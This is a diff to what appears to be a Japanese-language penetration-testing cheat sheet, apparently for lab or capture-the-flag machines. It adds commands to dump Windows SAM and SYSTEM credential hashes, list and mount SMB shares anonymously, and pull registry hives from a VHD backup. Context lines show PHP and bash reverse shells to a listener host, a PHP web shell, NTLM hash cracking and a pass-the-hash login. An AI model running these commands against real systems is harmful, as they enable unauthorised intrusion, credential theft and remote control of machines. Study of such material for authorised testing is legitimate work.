@@ -465,6 +465,10 @@ C:\Windows\System32\config\RegBack\SYSTEM.OLD
 ```
 ```
 pwdump systemfile samfile
+
+samdump2 SYSTEM SAM
+
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
 #### Log Poisoning(LFI2RCE)
@@ -989,12 +993,27 @@ enum4linux -S -U -o 10.10.10.1
 ### smbclient
 匿名ログインが有効になっているかの確認。
 ```
+smbclient -L -N 10.10.10.1
 smbclient -L 10.10.10.1
 smbclient //10.10.10.1/tmp
 smbclient //10.10.10.1/tmp -U <username>
 ```
+- -L...リストを表示
+- -N...パスワードなし
 - -U...ユーザ名の指定
 - -p...ポートの指定
+
+#### 共有フォルダのマウント
+```
+sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
+sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
+```
+
+VHD Mount(VHDファイルからSAMとSYSTEMを抽出):
+```
+sudo apt-get install libguestfs-tools
+sudo guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/test
+```
 
 ### smbmap
 ドメイン全体のsamba共有ドライブを列挙するために使用。
@@ -1264,15 +1283,15 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 ```
 
 ### PHP
+pentestmonkey reverse shell:  
+https://github.com/pentestmonkey/php-reverse-shell.git
+
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ```
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
-pentestmonkey reverse shell:
-https://github.com/pentestmonkey/php-reverse-shell.git
-
 ```
 # Web Shell
 <?php echo system($_REQUEST ["cmd"]); ?>
@@ -2662,7 +2681,7 @@ hashcatを使用してNTLMハッシュをクラックする。
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 ```
 
-## Passwords - Passing the Hash
+## Passwords - Pass The Hash
 ハッシュを使用して認証できるため、hashcatなどでパスワードクラックせずとも管理者ハッシュでログインできる。
 ```
 pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュの両方が含まれているもの>' //10.10.10.1 cmd.exe
